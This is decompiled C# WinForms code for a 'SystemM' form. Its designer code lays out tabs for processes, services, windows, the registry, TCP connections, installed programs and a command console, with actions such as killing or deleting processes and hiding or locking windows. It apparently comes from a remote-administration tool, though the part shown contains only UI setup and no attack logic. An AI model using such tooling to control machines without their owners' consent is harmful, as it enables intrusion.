		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CopyPathToolStripMenuItem_Click;
			if (_CopyPathToolStripMenuItem != null)
			{
				((ToolStripItem)_CopyPathToolStripMenuItem).remove_Click(eventHandler);
			}
			_CopyPathToolStripMenuItem = value;
			if (_CopyPathToolStripMenuItem != null)
			{
				((ToolStripItem)_CopyPathToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ImageList ImageList3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList3 = value;
		}
	}

	internal virtual ToolStripMenuItem PrToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _PrToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PrToolStripMenuItem_Click;
			if (_PrToolStripMenuItem != null)
			{
				((ToolStripItem)_PrToolStripMenuItem).remove_Click(eventHandler);
			}
			_PrToolStripMenuItem = value;
			if (_PrToolStripMenuItem != null)
			{
				((ToolStripItem)_PrToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public SystemM()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(SystemManager_FormClosing));
		((Form)this).add_Load((EventHandler)SystemM_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Expected O, but got Unknown
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected O, but got Unknown
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Expected O, but got Unknown
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Expected O, but got Unknown
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Expected O, but got Unknown
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Expected O, but got Unknown
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Expected O, but got Unknown
		//IL_01ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Expected O, but got Unknown
		//IL_01b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Expected O, but got Unknown
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		//IL_01d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e2: Expected O, but got Unknown
		//IL_01e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ed: Expected O, but got Unknown
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		//IL_01ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Expected O, but got Unknown
		//IL_020a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0214: Expected O, but got Unknown
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Expected O, but got Unknown
		//IL_0226: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Expected O, but got Unknown
		//IL_0231: Unknown result type (might be due to invalid IL or missing references)
		//IL_023b: Expected O, but got Unknown
		//IL_023c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0246: Expected O, but got Unknown
		//IL_0247: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Expected O, but got Unknown
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_025c: Expected O, but got Unknown
		//IL_025d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0267: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Expected O, but got Unknown
		//IL_02ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected O, but got Unknown
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		//IL_0370: Expected O, but got Unknown
		//IL_0371: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Expected O, but got Unknown
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Expected O, but got Unknown
		//IL_0387: Unknown result type (might be due to invalid IL or missing references)
		//IL_0391: Expected O, but got Unknown
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Expected O, but got Unknown
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Expected O, but got Unknown
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b2: Expected O, but got Unknown
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bd: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d3: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Expected O, but got Unknown
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ff: Expected O, but got Unknown
		//IL_0400: Unknown result type (might be due to invalid IL or missing references)
		//IL_040a: Expected O, but got Unknown
		//IL_040b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0415: Expected O, but got Unknown
		//IL_0416: Unknown result type (might be due to invalid IL or missing references)
		//IL_0420: Expected O, but got Unknown
		//IL_0421: Unknown result type (might be due to invalid IL or missing references)
		//IL_042b: Expected O, but got Unknown
		//IL_042c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0436: Expected O, but got Unknown
		//IL_0437: Unknown result type (might be due to invalid IL or missing references)
		//IL_0441: Expected O, but got Unknown
		//IL_0442: Unknown result type (might be due to invalid IL or missing references)
		//IL_044c: Expected O, but got Unknown
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0457: Expected O, but got Unknown
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Expected O, but got Unknown
		//IL_0463: Unknown result type (might be due to invalid IL or missing references)
		//IL_046d: Expected O, but got Unknown
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0478: Expected O, but got Unknown
		//IL_0479: Unknown result type (might be due to invalid IL or missing references)
		//IL_0483: Expected O, but got Unknown
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		//IL_048e: Expected O, but got Unknown
		//IL_048f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0499: Expected O, but got Unknown
		//IL_049a: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a4: Expected O, but got Unknown
		//IL_04a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04af: Expected O, but got Unknown
		//IL_04b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ba: Expected O, but got Unknown
		//IL_04bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Expected O, but got Unknown
		//IL_04c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d0: Expected O, but got Unknown
		//IL_04d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04db: Expected O, but got Unknown
		//IL_04dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Expected O, but got Unknown
		//IL_04e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f1: Expected O, but got Unknown
		//IL_04f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fc: Expected O, but got Unknown
		//IL_04fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0507: Expected O, but got Unknown
		//IL_0508: Unknown result type (might be due to invalid IL or missing references)
		//IL_0512: Expected O, but got Unknown
		//IL_0513: Unknown result type (might be due to invalid IL or missing references)
		//IL_051d: Expected O, but got Unknown
		//IL_051e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0528: Expected O, but got Unknown
		//IL_0529: Unknown result type (might be due to invalid IL or missing references)
		//IL_0533: Expected O, but got Unknown
		//IL_0534: Unknown result type (might be due to invalid IL or missing references)
		//IL_053e: Expected O, but got Unknown
		//IL_053f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0549: Expected O, but got Unknown
		//IL_054a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0554: Expected O, but got Unknown
		//IL_0555: Unknown result type (might be due to invalid IL or missing references)
		//IL_055f: Expected O, but got Unknown
		//IL_0560: Unknown result type (might be due to invalid IL or missing references)
		//IL_056a: Expected O, but got Unknown
		//IL_056b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0575: Expected O, but got Unknown
		//IL_0576: Unknown result type (might be due to invalid IL or missing references)
		//IL_0580: Expected O, but got Unknown
		//IL_0581: Unknown result type (might be due to invalid IL or missing references)
		//IL_058b: Expected O, but got Unknown
		//IL_058c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0596: Expected O, but got Unknown
		//IL_0597: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a1: Expected O, but got Unknown
		//IL_05a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ac: Expected O, but got Unknown
		//IL_05ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b7: Expected O, but got Unknown
		//IL_05b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c2: Expected O, but got Unknown
		//IL_05c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cd: Expected O, but got Unknown
		//IL_0718: Unknown result type (might be due to invalid IL or missing references)
		//IL_0722: Expected O, but got Unknown
		//IL_07dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e7: Expected O, but got Unknown
		//IL_08a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ac: Expected O, but got Unknown
		//IL_1396: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a0: Expected O, but got Unknown
		//IL_1960: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c62: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c6c: Expected O, but got Unknown
		//IL_1e65: Unknown result type (might be due to invalid IL or missing references)
		//IL_2008: Unknown result type (might be due to invalid IL or missing references)
		//IL_2012: Expected O, but got Unknown
		//IL_219b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2322: Unknown result type (might be due to invalid IL or missing references)
		//IL_232c: Expected O, but got Unknown
		//IL_2514: Unknown result type (might be due to invalid IL or missing references)
		//IL_260c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2616: Expected O, but got Unknown
		//IL_26db: Unknown result type (might be due to invalid IL or missing references)
		//IL_26e5: Expected O, but got Unknown
		//IL_2894: Unknown result type (might be due to invalid IL or missing references)
		//IL_289e: Expected O, but got Unknown
		//IL_2a06: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a10: Expected O, but got Unknown
		//IL_2bcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d42: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d4c: Expected O, but got Unknown
		//IL_300e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3018: Expected O, but got Unknown
		//IL_323e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3248: Expected O, but got Unknown
		//IL_3353: Unknown result type (might be due to invalid IL or missing references)
		//IL_335d: Expected O, but got Unknown
		//IL_3535: Unknown result type (might be due to invalid IL or missing references)
		//IL_353f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(SystemM));
		ImageList1 = new ImageList(components);
		Images = new ImageList(components);
		RegIcons = new ImageList(components);
		AWCL = new ContextMenuStrip(components);
		RefreshToolStripMenuItem = new ToolStripMenuItem();
		HideToolStripMenuItem = new ToolStripMenuItem();
		ShowToolStripMenuItem = new ToolStripMenuItem();
		RenameToolStripMenuItem = new ToolStripMenuItem();
		MaximizeToolStripMenuItem = new ToolStripMenuItem();
		MinimizeToolStripMenuItem = new ToolStripMenuItem();
		LoToolStripMenuItem = new ToolStripMenuItem();
		UnlockXButtonToolStripMenuItem = new ToolStripMenuItem();
		HKMenu = new ContextMenuStrip(components);
		RefreshToolStripMenuItem1 = new ToolStripMenuItem();
		CreateKeyToolStripMenuItem = new ToolStripMenuItem();
		DeleteSelectedToolStripMenuItem = new ToolStripMenuItem();
		HKVMenu = new ContextMenuStrip(components);
		RefreshToolStripMenuItem2 = new ToolStripMenuItem();
		NewToolStripMenuItem = new ToolStripMenuItem();
		StringToolStripMenuItem = new ToolStripMenuItem();
		BinaryToolStripMenuItem = new ToolStripMenuItem();
		DWOToolStripMenuItem = new ToolStripMenuItem();
		QWORDToolStripMenuItem = new ToolStripMenuItem();
		MultiStringToolStripMenuItem = new ToolStripMenuItem();
		ExpandStringToolStripMenuItem = new ToolStripMenuItem();
		DeleteToolStripMenuItem = new ToolStripMenuItem();
		PITMenu = new ContextMenuStrip(components);
		RefreshToolStripMenuItem6 = new ToolStripMenuItem();
		RemoveToolStripMenuItem = new ToolStripMenuItem();
		PMenustrip = new ContextMenuStrip(components);
		RefreshToolStripMenuItem4 = new ToolStripMenuItem();
		KillDeleteToolStripMenuItem = new ToolStripMenuItem();
		KillProcessToolStripMenuItem = new ToolStripMenuItem();
		RestartProcessToolStripMenuItem = new ToolStripMenuItem();
		SuspendProcessToolStripMenuItem = new ToolStripMenuItem();
		ResumeProcessToolStripMenuItem = new ToolStripMenuItem();
		CopyPathToolStripMenuItem = new ToolStripMenuItem();
		PrToolStripMenuItem = new ToolStripMenuItem();
		TCPCL = new ContextMenuStrip(components);
		RefreshToolStripMenuItem5 = new ToolStripMenuItem();
		KillConnectionToolStripMenuItem = new ToolStripMenuItem();
		SMCL = new ContextMenuStrip(components);
		RefreshToolStripMenuItem3 = new ToolStripMenuItem();
		StartToolStripMenuItem = new ToolStripMenuItem();
		PauseToolStripMenuItem = new ToolStripMenuItem();
		PauseToolStripMenuItem1 = new ToolStripMenuItem();
		RestartToolStripMenuItem = new ToolStripMenuItem();
		RefreshServiceToolStripMenuItem = new ToolStripMenuItem();
		ImageList2 = new ImageList(components);
		ImageList3 = new ImageList(components);
		EtherealTabControl1 = new EtherealTabControl();
		TabPage1 = new TabPage();
		Button1 = new Button();
		StatusStrip5 = new StatusStrip();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		ToolStripStatusLabel2 = new ToolStripStatusLabel();
		ToolStripStatusLabel4 = new ToolStripStatusLabel();
		MenuStrip2 = new MenuStrip();
		Processlists = new ListView();
		ColumnHeader4 = new ColumnHeader();
		ColumnHeader5 = new ColumnHeader();
		ColumnHeader6 = new ColumnHeader();
		ColumnHeader7 = new ColumnHeader();
		ColumnHeader8 = new ColumnHeader();
		ColumnHeader9 = new ColumnHeader();
		ColumnHeader25 = new ColumnHeader();
		ColumnHeader26 = new ColumnHeader();
		ColumnHeader27 = new ColumnHeader();
		TabPage2 = new TabPage();
		StatusStrip4 = new StatusStrip();
		ToolStripStatusLabel5 = new ToolStripStatusLabel();
		ToolStripStatusLabel8 = new ToolStripStatusLabel();
		SM = new ListView();
		ColumnHeader10 = new ColumnHeader();
		ColumnHeader11 = new ColumnHeader();
		ColumnHeader12 = new ColumnHeader();
		ColumnHeader13 = new ColumnHeader();
		ColumnHeader14 = new ColumnHeader();
		TabPage3 = new TabPage();
		StatusStrip3 = new StatusStrip();
		ToolStripStatusLabel3 = new ToolStripStatusLabel();
		AW = new ListView();
		ColumnHeader1 = new ColumnHeader();
		ColumnHeader2 = new ColumnHeader();
		ColumnHeader3 = new ColumnHeader();
		ColumnHeader28 = new ColumnHeader();
		ColumnHeader29 = new ColumnHeader();
		ColumnHeader30 = new ColumnHeader();
		ColumnHeader31 = new ColumnHeader();
		TabPage4 = new TabPage();
		Panel5 = new Panel();
		RegPath = new Label();
		ValuesRegName = new ListView();
		ColumnHeader22 = new ColumnHeader();
		ColumnHeader23 = new ColumnHeader();
		ColumnHeader24 = new ColumnHeader();
		Panel4 = new Panel();
		RegValues = new ComboBox();
		PictureBox1 = new PictureBox();
		KeysName = new ListView();
		ColumnHeader21 = new ColumnHeader();
		StatusStrip6 = new StatusStrip();
		ToolStripStatusLabel7 = new ToolStripStatusLabel();
		TabPage5 = new TabPage();
		StatusStrip2 = new StatusStrip();
		ToolStripStatusLabel6 = new ToolStripStatusLabel();
		TCPC = new ListView();
		ColumnHeader15 = new ColumnHeader();
		ColumnHeader16 = new ColumnHeader();
		ColumnHeader17 = new ColumnHeader();
		ColumnHeader18 = new ColumnHeader();
		ColumnHeader19 = new ColumnHeader();
		TabPage6 = new TabPage();
		StatusStrip1 = new StatusStrip();
		ToolStripStatusLabel9 = new ToolStripStatusLabel();
		PIIT = new ListView();
		ColumnHeader20 = new ColumnHeader();
		ColumnHeader32 = new ColumnHeader();
		TabPage7 = new TabPage();
		Panel3 = new Panel();
		ResultCMD = new TextBox();
		Panel2 = new Panel();
		Commands = new TextBox();
		Panel1 = new Panel();
		MenuStrip1 = new MenuStrip();
		StartToolStripMenuItem1 = new ToolStripMenuItem();
		((Control)AWCL).SuspendLayout();
		((Control)HKMenu).SuspendLayout();
		((Control)HKVMenu).SuspendLayout();
		((Control)PITMenu).SuspendLayout();
		((Control)PMenustrip).SuspendLayout();
		((Control)TCPCL).SuspendLayout();
		((Control)SMCL).SuspendLayout();
		((Control)EtherealTabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)StatusStrip5).SuspendLayout();
		((Control)TabPage2).SuspendLayout();
		((Control)StatusStrip4).SuspendLayout();
		((Control)TabPage3).SuspendLayout();
		((Control)StatusStrip3).SuspendLayout();
		((Control)TabPage4).SuspendLayout();
		((Control)Panel5).SuspendLayout();
		((Control)Panel4).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)StatusStrip6).SuspendLayout();
		((Control)TabPage5).SuspendLayout();
		((Control)StatusStrip2).SuspendLayout();
		((Control)TabPage6).SuspendLayout();
		((Control)StatusStrip1).SuspendLayout();
		((Control)TabPage7).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)MenuStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "1485007048_miscellaneous-12.png");
		ImageList1.get_Images().SetKeyName(1, "1485007158_settings.png");
		ImageList1.get_Images().SetKeyName(2, "1485007240_49_Windows.png");
		ImageList1.get_Images().SetKeyName(3, "1485007353_editor-grid-view-block-glyph.png");
		ImageList1.get_Images().SetKeyName(4, "1485008048_16.png");
		ImageList1.get_Images().SetKeyName(5, "1485007588_list.png");
		ImageList1.get_Images().SetKeyName(6, "1485007669_terminal.png");
		Images.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("Images.ImageStream"));
		Images.set_TransparentColor(Color.Transparent);
		Images.get_Images().SetKeyName(0, "1485011616_Circle_Green.png");
		Images.get_Images().SetKeyName(1, "1485011624_Circle_Red.png");
		Images.get_Images().SetKeyName(2, "1485012477_application-x-ms-shortcut.png");
		Images.get_Images().SetKeyName(3, "1485012651_application.png");
		Images.get_Images().SetKeyName(4, "1485954647_window_app_blank.png");
		Images.get_Images().SetKeyName(5, "1485954833_button-white.png");
		Images.get_Images().SetKeyName(6, "1485012029_Circle_Orange.png");
		RegIcons.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("RegIcons.ImageStream"));
		RegIcons.set_TransparentColor(Color.Transparent);
		RegIcons.get_Images().SetKeyName(0, "1485011127_folder.png");
		RegIcons.get_Images().SetKeyName(1, "reg1.png");
		RegIcons.get_Images().SetKeyName(2, "reg2.png");
		((ToolStrip)AWCL).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
			(ToolStripItem)RefreshToolStripMenuItem,
			(ToolStripItem)HideToolStripMenuItem,
			(ToolStripItem)ShowToolStripMenuItem,
			(ToolStripItem)RenameToolStripMenuItem,
			(ToolStripItem)MaximizeToolStripMenuItem,
			(ToolStripItem)MinimizeToolStripMenuItem,
			(ToolStripItem)LoToolStripMenuItem,
			(ToolStripItem)UnlockXButtonToolStripMenuItem
		});
		((Control)AWCL).set_Name("AWCL");
		ContextMenuStrip aWCL = AWCL;
		Size size = new Size(169, 180);
		((Control)aWCL).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		((ToolStripItem)RefreshToolStripMenuItem).set_Name("RefreshToolStripMenuItem");
		ToolStripMenuItem refreshToolStripMenuItem = RefreshToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)refreshToolStripMenuItem).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem).set_Text("Refresh");
		((ToolStripItem)HideToolStripMenuItem).set_Image((Image)(object)Resources._1485014998_application_form_delete);
		((ToolStripItem)HideToolStripMenuItem).set_Name("HideToolStripMenuItem");
		ToolStripMenuItem hideToolStripMenuItem = HideToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)hideToolStripMenuItem).set_Size(size);
		((ToolStripItem)HideToolStripMenuItem).set_Text("Hide");
		((ToolStripItem)ShowToolStripMenuItem).set_Image((Image)(object)Resources._1485014987_application_form_add);
		((ToolStripItem)ShowToolStripMenuItem).set_Name("ShowToolStripMenuItem");
		ToolStripMenuItem showToolStripMenuItem = ShowToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)showToolStripMenuItem).set_Size(size);
		((ToolStripItem)ShowToolStripMenuItem).set_Text("Show");
		((ToolStripItem)RenameToolStripMenuItem).set_Image((Image)(object)Resources._1485015082_textfield_rename);
		((ToolStripItem)RenameToolStripMenuItem).set_Name("RenameToolStripMenuItem");
		ToolStripMenuItem renameToolStripMenuItem = RenameToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)renameToolStripMenuItem).set_Size(size);
		((ToolStripItem)RenameToolStripMenuItem).set_Text("Rename");
		((ToolStripItem)MaximizeToolStripMenuItem).set_Image((Image)(object)Resources._1485015177_arrow_maximise);
		((ToolStripItem)MaximizeToolStripMenuItem).set_Name("MaximizeToolStripMenuItem");
		ToolStripMenuItem maximizeToolStripMenuItem = MaximizeToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)maximizeToolStripMenuItem).set_Size(size);
		((ToolStripItem)MaximizeToolStripMenuItem).set_Text("Maximize");
		((ToolStripItem)MinimizeToolStripMenuItem).set_Image((Image)(object)Resources._1485015206_arrow_minimise);
		((ToolStripItem)MinimizeToolStripMenuItem).set_Name("MinimizeToolStripMenuItem");
		ToolStripMenuItem minimizeToolStripMenuItem = MinimizeToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)minimizeToolStripMenuItem).set_Size(size);
		((ToolStripItem)MinimizeToolStripMenuItem).set_Text("Minimize");
		((ToolStripItem)LoToolStripMenuItem).set_Image((Image)(object)Resources._1485015326_lock);
		((ToolStripItem)LoToolStripMenuItem).set_Name("LoToolStripMenuItem");
		ToolStripMenuItem loToolStripMenuItem = LoToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)loToolStripMenuItem).set_Size(size);
		((ToolStripItem)LoToolStripMenuItem).set_Text("Lock [X] Button");
		((ToolStripItem)UnlockXButtonToolStripMenuItem).set_Image((Image)(object)Resources._1485015332_lock_open);
		((ToolStripItem)UnlockXButtonToolStripMenuItem).set_Name("UnlockXButtonToolStripMenuItem");
		ToolStripMenuItem unlockXButtonToolStripMenuItem = UnlockXButtonToolStripMenuItem;
		size = new Size(168, 22);
		((ToolStripItem)unlockXButtonToolStripMenuItem).set_Size(size);
		((ToolStripItem)UnlockXButtonToolStripMenuItem).set_Text("Unlock [X] Button");
		((ToolStrip)HKMenu).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)RefreshToolStripMenuItem1,
			(ToolStripItem)CreateKeyToolStripMenuItem,
